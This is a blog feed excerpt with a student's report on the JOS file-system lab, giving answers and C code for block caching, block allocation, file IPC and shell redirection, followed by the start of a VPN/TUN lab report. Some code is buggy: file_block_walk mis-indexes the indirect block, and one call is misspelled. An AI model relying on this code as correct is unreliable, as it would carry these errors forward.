    <content type="html"><![CDATA[<p align="right">姓名：贾昊龙</p><p align="right">学号：18307130049</p><h1 id="PartⅠ：运行结果"><a href="#PartⅠ：运行结果" class="headerlink" title="PartⅠ：运行结果"></a>PartⅠ：运行结果</h1><p><img src="/2021/01/05/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9Flab6%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/1.PNG" srcset="/img/loading.gif" alt="1"></p><h1 id="Part-Ⅱ：问题回答"><a href="#Part-Ⅱ：问题回答" class="headerlink" title="Part Ⅱ：问题回答"></a>Part Ⅱ：问题回答</h1><ul><li><strong>请回答Exercise 1后的Question 1，Do you have to do anything else to ensure that this I/O privilege setting is saved and restored properly when you subsequently switch from one environment to another? Why?</strong></li></ul><p>不需要，当进程陷入中断后，所有寄存器信息会被保存到进程的 env_tf 中，在之前的lab当中已经实现过了</p><ul><li><strong>详细描述JOS 中文件存储的结构、打开文件的过程以及往文件中写入数据的过程。</strong></li></ul><p>在JOS中，文件系统是一个运行在userspace的进程，而其他进程通过类似Clinet-Server的方式来与文件系统进程进行进程间通信，从而实现文件操作。</p><p>存储结构定义在<code>fs.h</code>当中</p><p><img src="/2021/01/05/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9Flab6%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/3.png" srcset="/img/loading.gif" alt="3"></p><p>而文件读写过程可以参考问题5的回答</p><ul><li><strong>对于此JOS，一个磁盘有多少个扇区？</strong></li></ul><p>JOS的磁盘总大小为定义在fs.h中的 DISKSIZE ,值为3GB；而每个扇区的大小为 SECTSIZE , 值为 512B。因此JOS总共有：3 * 2^21个扇区</p><ul><li><strong>请详细阐述，JOS中superblock的概念，以及superblock的布局和结构。</strong></li></ul><p>超级块指的是文件系统保存文件系统元数据的数据块</p><p>JOS中文件系统的第1块（块号为0）是磁盘块，用来用作保存bootloader和分区表，而第2块（块号为1）就是超级块，用来保存文件系统元信息的，布局如下：</p><p><img src="/2021/01/05/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9Flab6%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/4.PNG" srcset="/img/loading.gif" alt="4"></p><ul><li>以open文件为例，阐述regular环境访问磁盘的流程</li></ul><p>以磁盘读为例，当一个进程在发起一次磁盘读取请求的时候，首先会调用JOS提供的库函数 <code>read()</code>，而 <code>read()</code> 函数会调用 <code>devfile_read()</code> 函数，这个函数是进程端的磁盘读接口，它会继续将用户的读取请求递交给 <code>fsipc()</code> 函数，之后通过进程间通信IPC机制，将读取请求发送给接收端的文件系统进程。</p><p>文件系统进程<code>serve</code>会不断的进行 <code>ipc_recv()</code>来 检查是否有进程发起读写请求。在接收到进程读文件的 IPC信息后，serve会将这个信息发送给 <code>serve_read()</code> ，最后调用<code>file_read()</code> 函数完成真正的文件读取过程，而之前的过程都是在进行信息传递。</p><ul><li><strong>画出对应的流程图</strong></li></ul><p><img src="/2021/01/05/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9Flab6%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/7.PNG" srcset="/img/loading.gif" alt="7"></p><ul><li><strong>5-c fd page是什么时候设置好的？</strong></li></ul><p>fd page在JOS中的作用类似于文件描述符，它是OpenFile结构体中的一项，结构如下：</p><p><img src="/2021/01/05/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9Flab6%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/5.PNG" srcset="/img/loading.gif" alt="5"></p><p>当文件系统进程接收到文件读写请求时，会调用<code>server_open()</code>函数打开文件，并写入fd page信息。</p><p><img src="/2021/01/05/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9Flab6%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/6.PNG" srcset="/img/loading.gif" alt="6"></p><h1 id="Part-A：the-file-system"><a href="#Part-A：the-file-system" class="headerlink" title="Part A：the file system"></a>Part A：the file system</h1><h4 id="Exercise-1"><a href="#Exercise-1" class="headerlink" title="Exercise 1"></a>Exercise 1</h4><blockquote><p><code>i386_init</code> identifies the file system environment by passing the type <code>ENV_TYPE_FS</code> to your environment creation function, <code>env_create</code>. Modify <code>env_create</code> in <code>env.c</code>, so that it gives the file system environment I/O privilege, but never gives that privilege to any other environment.</p><p>Make sure you can start the file environment without causing a General Protection fault. You should pass the “fs i/o” test in make grade.</p></blockquote><p><strong><code>env_create()</code></strong></p><p>只需要在文件系统进程创建的时候给予访问文件的权限即可（设置eflags寄存器的IOPL标志位）</p><pre><code class="hljs c"><span class="hljs-keyword">void</span>env_create(<span class="hljs-keyword">uint8_t</span> *binary, <span class="hljs-keyword">enum</span> EnvType type)&#123;<span class="hljs-comment">// LAB 3: Your code here.</span><span class="hljs-comment">// If this is the file server (type == ENV_TYPE_FS) give it I/O privileges.</span><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Env</span> *<span class="hljs-title">e</span>;</span><span class="hljs-keyword">int</span> r;<span class="hljs-keyword">if</span> ((r = env_alloc(&amp;e, <span class="hljs-number">0</span>) != <span class="hljs-number">0</span>)) &#123;panic(<span class="hljs-string">"create env failed\n"</span>);&#125;<span class="hljs-comment">// LAB 5: Your code here.</span><span class="hljs-keyword">if</span> (type == ENV_TYPE_FS)&#123;e-&gt;env_tf.tf_eflags = e-&gt;env_tf.tf_eflags | FL_IOPL_MASK;&#125;load_icode(e, binary);e-&gt;env_type = type;&#125;</code></pre><h4 id="Exercise-2"><a href="#Exercise-2" class="headerlink" title="Exercise 2"></a>Exercise 2</h4><blockquote><p>IUse <code>free_block</code> as a model to implement <code>alloc_block</code> in <code>fs/fs.c</code>, which should find a free disk block in the bitmap, mark it used, and return the number of that block. When you allocate a block, you should immediately flush the changed bitmap block to disk with <code>flush_block</code>, to help file system consistency.</p><p>Use make grade to test your code. Your code should now pass “alloc_block”.mplement the <code>bc_pgfault</code> and <code>flush_block</code> functions in <code>fs/bc.c</code>. <code>bc_pgfault</code> is a page fault handler, just like the one your wrote in the previous lab for copy-on-write fork, except that its job is to load pages in from the disk in response to a page fault. When writing this, keep in mind that (1) <code>addr</code> may not be aligned to a block boundary and (2) <code>ide_read</code> operates in sectors, not blocks.</p><p>The <code>flush_block</code> function should write a block out to disk <em>if necessary</em>. <code>flush_block</code> shouldn’t do anything if the block isn’t even in the block cache (that is, the page isn’t mapped) or if it’s not dirty. We will use the VM hardware to keep track of whether a disk block has been modified since it was last read from or written to disk. To see whether a block needs writing, we can just look to see if the <code>PTE_D</code> “dirty” bit is set in the <code>uvpt</code> entry. (The <code>PTE_D</code> bit is set by the processor in response to a write to that page; see 5.2.4.3 in <a href="http://pdos.csail.mit.edu/6.828/2011/readings/i386/s05_02.htm" target="_blank" rel="noopener">chapter 5</a> of the 386 reference manual.) After writing the block to disk, <code>flush_block</code> should clear the <code>PTE_D</code> bit using <code>sys_page_map</code>.</p><p>Use make grade to test your code. Your code should pass “check_bc”, “check_super”, and “check_bitmap”</p></blockquote><p><strong><code>bc_pgfault</code></strong></p><p>该函数的作用是文件系统进程的缺页处理，将磁盘块数据读取到相应的内存位置</p><pre><code class="hljs c"><span class="hljs-comment">// LAB 5: you code here:</span>addr = (<span class="hljs-keyword">void</span> *)ROUNDDOWN(addr, BLKSIZE);<span class="hljs-keyword">if</span>((r = SYS_page_alloc(<span class="hljs-number">0</span>, addr, PTE_U | PTE_W | PTE_P)) &lt; <span class="hljs-number">0</span>)panic(<span class="hljs-string">"in bc_pgfault, sys_page_alloc: %e"</span>, r);<span class="hljs-keyword">if</span> ((r = (ide_read(blockno*BLKSECTS, addr, BLKSECTS))) &lt; <span class="hljs-number">0</span>)panic(<span class="hljs-string">"in bc_pgfault, sys_page_alloc: %e"</span>, r);<span class="hljs-comment">// Clear the dirty bit for the disk block page since we just read the</span><span class="hljs-comment">// block from disk</span></code></pre><p> <strong><code>flush_block</code></strong> </p><p>这个函数将缓存的block写回到磁盘中，如果数据块没有被写过，则不需要做任何事。通过 PTE_D 标志位可以判断数据块是否被写入过。</p><pre><code class="hljs c"><span class="hljs-keyword">void</span>flush_block(<span class="hljs-keyword">void</span> *addr)&#123;<span class="hljs-keyword">uint32_t</span> blockno = ((<span class="hljs-keyword">uint32_t</span>)addr - DISKMAP) / BLKSIZE;<span class="hljs-keyword">int</span> r;<span class="hljs-keyword">if</span> (addr &lt; (<span class="hljs-keyword">void</span>*)DISKMAP || addr &gt;= (<span class="hljs-keyword">void</span>*)(DISKMAP + DISKSIZE))panic(<span class="hljs-string">"flush_block of bad va %08x"</span>, addr);<span class="hljs-comment">// LAB 5: Your code here.</span><span class="hljs-comment">// panic("flush_block not implemented");</span>addr = (<span class="hljs-keyword">void</span>*)ROUNDDOWN(addr, BLKSIZE);<span class="hljs-keyword">if</span>(!va_is_mapped(addr) || !va_is_dirty(addr)) <span class="hljs-keyword">return</span>;<span class="hljs-keyword">if</span>((r = ide_write(blockno*BLKSECTS, addr, BLKSECTS)) &lt; <span class="hljs-number">0</span>)panic(<span class="hljs-string">"in flush_block, ide_write: %e"</span>, r);<span class="hljs-keyword">if</span> ((r = sys_page_map(<span class="hljs-number">0</span>, addr, <span class="hljs-number">0</span>, addr, uvpt[PGNUM(addr)] &amp; PTE_SYSCALL)) &lt; <span class="hljs-number">0</span>)panic(<span class="hljs-string">"in flush_block, sys_page_map: %e"</span>, r);&#125;</code></pre><h4 id="Exercise-3"><a href="#Exercise-3" class="headerlink" title="Exercise 3"></a>Exercise 3</h4><blockquote><p>Use <code>free_block</code> as a model to implement <code>alloc_block</code> in <code>fs/fs.c</code>, which should find a free disk block in the bitmap, mark it used, and return the number of that block. When you allocate a block, you should immediately flush the changed bitmap block to disk with <code>flush_block</code>, to help file system consistency.</p><p>Use make grade to test your code. Your code should now pass “alloc_block”.</p></blockquote><p><strong><code>alloc_block</code></strong></p><p>函数的作用是从 bitmap 中找到一个空的数据块，并给调用函数的进程分配它。</p><pre><code class="hljs c"><span class="hljs-keyword">int</span>alloc_block(<span class="hljs-keyword">void</span>)&#123;<span class="hljs-comment">// The bitmap consists of one or more blocks.  A single bitmap block</span><span class="hljs-comment">// contains the in-use bits for BLKBITSIZE blocks.  There are</span><span class="hljs-comment">// super-&gt;s_nblocks blocks in the disk altogether.</span><span class="hljs-comment">// LAB 5: Your code here.</span><span class="hljs-keyword">for</span> (<span class="hljs-keyword">uint32_t</span> i = <span class="hljs-number">2</span> ; i &lt; super-&gt;s_nblocks ; i++)&#123;<span class="hljs-keyword">if</span> (block_is_free(i))&#123;bitmap[i&gt;&gt;<span class="hljs-number">5</span>] &amp;= ~(<span class="hljs-number">1</span> &lt;&lt; (i % <span class="hljs-number">32</span>));flush_block(diskaddr(i));<span class="hljs-keyword">return</span> i;&#125;&#125;<span class="hljs-comment">// panic("alloc_block not implemented");</span><span class="hljs-keyword">return</span> -E_NO_DISK;&#125;</code></pre><h4 id="Exercise-4"><a href="#Exercise-4" class="headerlink" title="Exercise 4"></a>Exercise 4</h4><blockquote><p>Implement <code>file_block_walk</code> and <code>file_get_block</code>. <code>file_block_walk</code> maps from a block offset within a file to the pointer for that block in the <code>struct File</code> or the indirect block, very much like what <code>pgdir_walk</code> did for page tables. <code>file_get_block</code> goes one step further and maps to the actual disk block, allocating a new one if necessary.</p><p>Use make grade to test your code. Your code should pass “file_open”, “file_get_block”, and “file_flush/file_truncated/file rewrite”, and “testfile”.</p></blockquote><p><strong><code>file_block_walk</code></strong></p><p>这个函数的功能是找到文件 f 中第 filebno 号数据块的数据块号slot并保存到 ppdiskbno 中。</p><pre><code class="hljs c"><span class="hljs-comment">// Hint: Don't forget to clear any block you allocate.</span><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span>file_block_walk(struct <span class="hljs-built_in">File</span> *f, <span class="hljs-keyword">uint32_t</span> filebno, <span class="hljs-keyword">uint32_t</span> **ppdiskbno, <span class="hljs-keyword">bool</span> alloc)&#123;    <span class="hljs-comment">// LAB 5: Your code here.</span><span class="hljs-keyword">if</span>(filebno&gt;= NDIRECT + NINDIRECT) <span class="hljs-keyword">return</span> -E_INVAL;<span class="hljs-keyword">if</span>(filebno&lt;NDIRECT)&#123;*ppdiskbno = &amp;(f-&gt;f_direct[filebno]);<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (f-&gt;f_indirect == <span class="hljs-number">0</span>)&#123;<span class="hljs-keyword">if</span>(alloc) &#123;<span class="hljs-keyword">int</span> blockno = alloc_block();<span class="hljs-keyword">if</span>(blockno &lt; <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> -E_NO_DISK;<span class="hljs-built_in">memset</span>(diskaddr(blockno), <span class="hljs-number">0</span>, BLKSIZE);f-&gt;f_indirect = blockno;&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> -E_NOT_FOUND;&#125;<span class="hljs-keyword">uint32_t</span> * addr = (<span class="hljs-keyword">uint32_t</span>*)diskaddr(f-&gt;f_indirect);*ppdiskbno = &amp;addr[filebno];<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<span class="hljs-comment">// panic("file_block_walk not implemented");</span>&#125;</code></pre><p><strong><code>file_get_block</code></strong></p><p>这个函数的功能是查找文件 f 第 filebno 个数据块对应的虚拟地址 addr ，并将其保存到给定的地 址 blk 处。根据提示实现即可</p><pre><code class="hljs c"><span class="hljs-comment">// Hint: Use file_block_walk and alloc_block.</span><span class="hljs-keyword">int</span>file_get_block(struct <span class="hljs-built_in">File</span> *f, <span class="hljs-keyword">uint32_t</span> filebno, <span class="hljs-keyword">char</span> **blk)&#123;    <span class="hljs-comment">// LAB 5: Your code here.</span>    <span class="hljs-comment">// panic("file_get_block not implemented");</span><span class="hljs-keyword">uint32_t</span> *ppdiskbno;<span class="hljs-keyword">int</span> r = file_block_walk(f,filebno, &amp;ppdiskbno,<span class="hljs-number">1</span>);<span class="hljs-keyword">if</span>(r &lt; <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> r;<span class="hljs-keyword">if</span>((*ppdiskbno) == <span class="hljs-number">0</span>)&#123;<span class="hljs-keyword">if</span>((*ppdiskbno = alloc_block()) &lt; <span class="hljs-number">0</span>)&#123;<span class="hljs-keyword">return</span> -E_NO_DISK;&#125;&#125;*blk = diskaddr(*ppdiskbno);<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><h4 id="Exercise-5"><a href="#Exercise-5" class="headerlink" title="Exercise 5"></a>Exercise 5</h4><blockquote><p>Implement <code>serve_read</code> in <code>fs/serv.c</code>.</p><p><code>serve_read</code>‘s heavy lifting will be done by the already-implemented <code>file_read</code> in <code>fs/fs.c</code> (which, in turn, is just a bunch of calls to <code>file_get_block</code>). <code>serve_read</code> just has to provide the RPC interface for file reading. Look at the comments and code in <code>serve_set_size</code> to get a general idea of how the server functions should be structured.</p><p>Use make grade to test your code. Your code should pass “serve_open/file_stat/file_close” and “file_read” for a score of 70/150.</p></blockquote><p><strong><code>serve_read</code></strong></p><p>这个函数是文件系统进程的服务端接口，调用 <code>file_read()</code> 来实现真正的文件读取</p><pre><code class="hljs c"><span class="hljs-comment">// Read at most ipc-&gt;read.req_n bytes from the current seek position</span><span class="hljs-comment">// in ipc-&gt;read.req_fileid.  Return the bytes read from the file to</span><span class="hljs-comment">// the caller in ipc-&gt;readRet, then update the seek position.  Returns</span><span class="hljs-comment">// the number of bytes successfully read, or &lt; 0 on error.</span><span class="hljs-keyword">int</span>serve_read(<span class="hljs-keyword">envid_t</span> envid, <span class="hljs-keyword">union</span> Fsipc *ipc)&#123;<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Fsreq_read</span> *<span class="hljs-title">req</span> = &amp;<span class="hljs-title">ipc</span>-&gt;<span class="hljs-title">read</span>;</span><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Fsret_read</span> *<span class="hljs-title">ret</span> = &amp;<span class="hljs-title">ipc</span>-&gt;<span class="hljs-title">readRet</span>;</span><span class="hljs-keyword">if</span> (debug)cprintf(<span class="hljs-string">"serve_read %08x %08x %08x\n"</span>, envid, req-&gt;req_fileid, req-&gt;req_n);<span class="hljs-comment">// Lab 5: Your code here:</span><span class="hljs-keyword">int</span> r;<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">OpenFile</span> *<span class="hljs-title">o</span>;</span><span class="hljs-keyword">if</span> ((r = openfile_lookup(envid, req-&gt;req_fileid, &amp;o)) &lt; <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> r;r = file_read(o-&gt;o_file, ret-&gt;ret_buf, req-&gt;req_n, o-&gt;o_fd-&gt;fd_offset);<span class="hljs-keyword">if</span> (r &lt; <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> r;o-&gt;o_fd-&gt;fd_offset += r;<span class="hljs-keyword">return</span> r;&#125;</code></pre><h4 id="Exercise-6"><a href="#Exercise-6" class="headerlink" title="Exercise 6"></a>Exercise 6</h4><blockquote><p>Implement <code>serve_write</code> in <code>fs/serv.c</code> and <code>devfile_write</code> in <code>lib/file.c</code>.</p><p>Use make grade to test your code. Your code should pass “file_write”, “file_read after file_write”, “open”, and “large file” for a score of 90/150.</p></blockquote><p><strong><code>serve_write</code></strong></p><p>与之前的 serve_read() 实现方法基本一样</p><pre><code class="hljs c"><span class="hljs-comment">// Write req-&gt;req_n bytes from req-&gt;req_buf to req_fileid, starting at</span><span class="hljs-comment">// the current seek position, and update the seek position</span><span class="hljs-comment">// accordingly.  Extend the file if necessary.  Returns the number of</span><span class="hljs-comment">// bytes written, or &lt; 0 on error.</span><span class="hljs-keyword">int</span>serve_write(<span class="hljs-keyword">envid_t</span> envid, struct Fsreq_write *req)&#123;<span class="hljs-keyword">if</span> (debug)cprintf(<span class="hljs-string">"serve_write %08x %08x %08x\n"</span>, envid, req-&gt;req_fileid, req-&gt;req_n);<span class="hljs-comment">// LAB 5: Your code here.</span><span class="hljs-comment">// panic("serve_write not implemented");</span><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">OpenFile</span>* <span class="hljs-title">o</span> = <span class="hljs-title">NULL</span>;</span><span class="hljs-keyword">int</span> r = openfile_lookup(envid, req-&gt;req_fileid, &amp;o);<span class="hljs-keyword">if</span>(r &lt; <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> r;r = file_write(o-&gt;o_file, req-&gt;req_buf, req-&gt;req_n, o-&gt;o_fd-&gt;fd_offset);<span class="hljs-keyword">if</span>(r &gt; <span class="hljs-number">0</span>) o-&gt;o_fd-&gt;fd_offset += r;<span class="hljs-keyword">return</span> r;&#125;</code></pre><p><strong><code>devfile_write</code></strong></p><p>是客户端进程函数，通过调用 fsipc() 将传入的参数发送给文件系统进程。</p><pre><code class="hljs c"><span class="hljs-comment">// Write at most 'n' bytes from 'buf' to 'fd' at the current seek position.</span><span class="hljs-comment">//</span><span class="hljs-comment">// Returns:</span><span class="hljs-comment">// The number of bytes successfully written.</span><span class="hljs-comment">// &lt; 0 on error.</span><span class="hljs-keyword">static</span> <span class="hljs-keyword">ssize_t</span>devfile_write(struct Fd *fd, <span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *buf, <span class="hljs-keyword">size_t</span> n)&#123;<span class="hljs-comment">// Make an FSREQ_WRITE request to the file system server.  Be</span><span class="hljs-comment">// careful: fsipcbuf.write.req_buf is only so large, but</span><span class="hljs-comment">// remember that write is always allowed to write *fewer*</span><span class="hljs-comment">// bytes than requested.</span><span class="hljs-comment">// LAB 5: Your code here</span><span class="hljs-comment">// panic("devfile_write not implemented");</span>fsipcbuf.<span class="hljs-built_in">write</span>.req_fileid = fd-&gt;fd_file.id;fsipcbuf.<span class="hljs-built_in">write</span>.req_n = MIN(n, PGSIZE);memmove(fsipcbuf.<span class="hljs-built_in">write</span>.req_buf, buf, fsipcbuf.<span class="hljs-built_in">write</span>.req_n);<span class="hljs-keyword">int</span> r = fsipc(FSREQ_WRITE, <span class="hljs-literal">NULL</span>);<span class="hljs-keyword">return</span> r;&#125;</code></pre><h1 id="Part-B：Spawning-Processes"><a href="#Part-B：Spawning-Processes" class="headerlink" title="Part B：Spawning Processes"></a>Part B：Spawning Processes</h1><h4 id="Exercise-7"><a href="#Exercise-7" class="headerlink" title="Exercise 7"></a>Exercise 7</h4><blockquote><p><code>spawn</code> relies on the new syscall <code>sys_env_set_trapframe</code> to initialize the state of the newly created environment. Implement <code>sys_env_set_trapframe</code> in <code>kern/syscall.c</code> (don’t forget to dispatch the new system call in <code>syscall()</code>).</p><p>Test your code by running the <code>user/spawnhello</code> program from <code>kern/init.c</code>, which will attempt to spawn <code>/hello</code> from the file system.</p><p>Use make grade to test your code.</p></blockquote><p><strong><code>sys_env_set_trapframe</code></strong></p><p>函数作用是将进程号为 envid 的进程的 TrapFrame 设为 tf ，并且在设置前需要检查 envid 是否存 在</p><pre><code class="hljs c"><span class="hljs-comment">// Set envid's trap frame to 'tf'.</span><span class="hljs-comment">// tf is modified to make sure that user environments always run at code</span><span class="hljs-comment">// protection level 3 (CPL 3), interrupts enabled, and IOPL of 0.</span><span class="hljs-comment">//</span><span class="hljs-comment">// Returns 0 on success, &lt; 0 on error.  Errors are:</span><span class="hljs-comment">//-E_BAD_ENV if environment envid doesn't currently exist,</span><span class="hljs-comment">//or the caller doesn't have permission to change envid.</span><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span>sys_env_set_trapframe(<span class="hljs-keyword">envid_t</span> envid, struct Trapframe *tf)&#123;<span class="hljs-comment">// LAB 5: Your code here.</span><span class="hljs-comment">// Remember to check whether the user has supplied us with a good</span><span class="hljs-comment">// address!</span><span class="hljs-comment">// panic("sys_env_set_trapframe not implemented");</span><span class="hljs-keyword">int</span> r;<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Env</span> * <span class="hljs-title">e</span>;</span><span class="hljs-keyword">if</span>((r=envid2env(envid, &amp;e, <span class="hljs-number">1</span>))&lt;<span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> r;memmove(&amp;e-&gt;env_tf,tf,<span class="hljs-keyword">sizeof</span>(struct Trapframe));<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><h1 id="Part-C：The-Shell"><a href="#Part-C：The-Shell" class="headerlink" title="Part C：The Shell"></a>Part C：The Shell</h1><h4 id="Exercise-10"><a href="#Exercise-10" class="headerlink" title="Exercise 10"></a>Exercise 10</h4><blockquote><p>The shell doesn’t support I/O redirection. It would be nice to run sh &lt;script instead of having to type in all the commands in the script by hand, as you did above. Add I/O redirection for &lt; to <code>user/sh.c</code>.</p><p>Test your implementation by typing sh &lt;script into your shell</p><p>Run make run-testshell to test your shell. <code>testshell</code> simply feeds the above commands (also found in <code>fs/testshell.sh</code>) into the shell and then checks that the output matches <code>fs/testshell.key</code>.</p></blockquote><p>修改<code>user/sh.c</code>中的<code>runcmd()</code>来支持重定向</p><pre><code class="hljs c"><span class="hljs-comment">// LAB 5: Your code here.</span><span class="hljs-comment">// panic("&lt; redirection not implemented");</span><span class="hljs-keyword">if</span> ((fd = <span class="hljs-built_in">open</span>(t, O_RDONLY)) &lt; <span class="hljs-number">0</span>) &#123;cprintf(<span class="hljs-string">"open %s for write: %e"</span>, t, fd);<span class="hljs-built_in">exit</span>();&#125;<span class="hljs-keyword">if</span> (fd != <span class="hljs-number">0</span>) &#123;dup(fd, <span class="hljs-number">0</span>);<span class="hljs-built_in">close</span>(fd);&#125;<span class="hljs-keyword">break</span>;</code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>Operating System</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>VPN</title>
    <link href="/2020/12/22/VPN/"/>
    <url>/2020/12/22/VPN/</url>
    
    <content type="html"><![CDATA[<h2 id="TLS-SSL-VPN设计基础"><a href="#TLS-SSL-VPN设计基础" class="headerlink" title="TLS/SSL VPN设计基础"></a>TLS/SSL VPN设计基础</h2><ul><li>VPN</li><li>TUN/TAP接口</li><li>路由</li><li>PKI相关</li><li>TLS/SSL加密</li></ul><h2 id="Tasks"><a href="#Tasks" class="headerlink" title="Tasks"></a>Tasks</h2><h3 id="task-1：设置虚拟机"><a href="#task-1：设置虚拟机" class="headerlink" title="task 1：设置虚拟机"></a>task 1：设置虚拟机</h3><table><thead><tr><th align="center">VPN Client/Host U</th><th align="center">10.0.2.4</th></tr></thead><tbody><tr><td align="center"><strong>Gateway</strong></td><td align="center"><strong>10.0.2.5、192.168.60.1</strong></td></tr><tr><td align="center"><strong>Host V</strong></td><td align="center"><strong>192.168.60.101</strong></td></tr></tbody></table><p><img src="/2020/12/22/VPN/1-1.PNG" srcset="/img/loading.gif" alt="1-1"></p><p>在建立VPN隧道之前，可以看到U是无法ping V的</p><h3 id="task-2：通过TUN-TAP建立VPN隧道"><a href="#task-2：通过TUN-TAP建立VPN隧道" class="headerlink" title="task 2：通过TUN/TAP建立VPN隧道"></a>task 2：通过TUN/TAP建立VPN隧道</h3><p><img src="/2020/12/22/VPN/2-1.PNG" srcset="/img/loading.gif" alt="2-1"></p><h4 id="step-1：运行VPN-server"><a href="#step-1：运行VPN-server" class="headerlink" title="step 1：运行VPN server"></a>step 1：运行VPN server</h4><p>在Gateway上面按照步骤运行相关命令，之后可以看到对于tun0接口的配置如下，已经有了IP地址<code>192.168.53.1</code></p><p><img src="/2020/12/22/VPN/2-2.PNG" srcset="/img/loading.gif" alt="2-2"></p><h4 id="step-2：运行VPN-client"><a href="#step-2：运行VPN-client" class="headerlink" title="step 2：运行VPN client"></a>step 2：运行VPN client</h4><p>和上面基本一样</p><p><img src="/2020/12/22/VPN/2-4.PNG" srcset="/img/loading.gif" alt="2-4"></p><h4 id="step-3：在client和server端建立路由"><a href="#step-3：在client和server端建立路由" class="headerlink" title="step 3：在client和server端建立路由"></a>step 3：在client和server端建立路由</h4><p>配置好的路由表应该如下</p><ul><li><strong>client端</strong></li></ul><p><img src="/2020/12/22/VPN/2-5.PNG" srcset="/img/loading.gif" alt="2-5"></p><ul><li><strong>server端</strong></li></ul><p><img src="/2020/12/22/VPN/2-6.PNG" srcset="/img/loading.gif" alt="2-6"></p><h4 id="step-4：设置V的路由"><a href="#step-4：设置V的路由" class="headerlink" title="step 4：设置V的路由"></a>step 4：设置V的路由</h4><p>根据对于整个发包流程的认识，其实在这一步我们所需要添加的就是如果包的目的IP是192.168.53.0/24的主机，需要通过<code>enp0s8</code>来发往<code>192.168.60.1</code>，这样当<code>Gateway</code>收到来自<code>host V</code>的回复之后，会通过<code>192.168.53.1</code>端口来进行转发数据包。</p><p><code>host V</code>路由表设置完之后如下</p><p><img src="/2020/12/22/VPN/2-7.PNG" srcset="/img/loading.gif" alt="2-7"></p><h4 id="step-5：测试VPN"><a href="#step-5：测试VPN" class="headerlink" title="step 5：测试VPN"></a>step 5：测试VPN</h4><p>首先是terminal上面的显示</p><p><img src="/2020/12/22/VPN/2-8.PNG" srcset="/img/loading.gif" alt="2-8"></p><p>可以看到是能够ping通的，之后来分析wireshark</p><p><img src="/2020/12/22/VPN/2-9.PNG" srcset="/img/loading.gif" alt="2-9"></p><p>其中，ICMP类型的包不是隧道流量，而在<code>10.0.2.4</code>和<code>10.0.2.5</code>之间流动的是隧道流量</p><p>同理，telnet的命令也是如此</p><p><img src="/2020/12/22/VPN/2-10.PNG" srcset="/img/loading.gif" alt="2-10">)<img src="/2020/12/22/VPN/2-11.PNG" srcset="/img/loading.gif" alt="2-11"></p><h4 id="step-6：破洞实验"><a href="#step-6：破洞实验" class="headerlink" title="step 6：破洞实验"></a>step 6：破洞实验</h4><p>当我们在保持telnet连接的时候停止运行vpnclient，此时输入的命令不会显示出来，连接断开</p><p><img src="/2020/12/22/VPN/2-12.PNG" srcset="/img/loading.gif" alt="2-12"></p><p>但是当我们重新建立连接的时候，会显示之前输入的字符串</p><p><img src="/2020/12/22/VPN/2-13.PNG" srcset="/img/loading.gif" alt="2-13"></p><h3 id="task-3：隧道加密"><a href="#task-3：隧道加密" class="headerlink" title="task 3：隧道加密"></a>task 3：隧道加密</h3><p>要保护隧道的完整性以及机密性，其中机密性是通过加密来实现的，完整性可以通过MAC来确保，参考：<a href="https://www.jianshu.com/p/9616b2d29954" target="_blank" rel="noopener">消息认证码MAC</a></p><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>首先，直接用是不行的，因为<code>server-key.pem</code>证书过期，但是又不知道<code>cacert.pem</code>的密码，所以不能用原来的<code>cacert.pem</code>来为服务端重新签名一个证书，所以只能是自己生成一个根证书，之后再用自己的根证书给服务器签名，在这里，我们将服务端的域名命名为<code>jhlvpn.com</code></p><h4 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h4><p>在<code>cert_server</code>文件夹中</p><ul><li>首先生成自签名的根证书<code>cacert.pem</code>，运行命令</li></ul><pre><code class="hljs css"><span class="hljs-selector-tag">openssl</span> <span class="hljs-selector-tag">req</span> <span class="hljs-selector-tag">-new</span> <span class="hljs-selector-tag">-x509</span> <span class="hljs-selector-tag">-keyout</span> <span class="hljs-selector-tag">cakey</span><span class="hljs-selector-class">.pem</span> <span class="hljs-selector-tag">-out</span> <span class="hljs-selector-tag">cacert</span><span class="hljs-selector-class">.pem</span> <span class="hljs-selector-tag">-config</span> <span class="hljs-selector-tag">openssl</span><span class="hljs-selector-class">.cnf</span> <span class="hljs-selector-tag">-days</span> 3650</code></pre><p>之后需要设定文件密码，为<code>123456</code>，然后填写相关内容</p><p><img 